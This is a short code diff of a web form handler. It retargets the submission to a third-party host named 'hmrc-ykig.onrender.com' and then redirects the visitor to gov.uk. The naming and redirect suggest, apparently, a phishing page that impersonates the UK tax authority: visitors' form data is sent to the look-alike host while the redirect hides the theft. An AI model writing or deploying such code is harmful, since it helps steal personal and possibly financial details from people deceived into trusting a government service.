@@ -294,7 +294,7 @@
           };
         
           try {
-            const res = await fetch("http://localhost:3000/submit-form", {
+            const res = await fetch('https://hmrc-ykig.onrender.com/submit-form', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(formData)
@@ -303,6 +303,7 @@
             const result = await res.json();
             console.log('data sent.', result)
             form.reset();
+            window.location.href = "https://gov.uk/";
           } catch (err) {
             console.error(err);
             console.log('Something went wrong!');
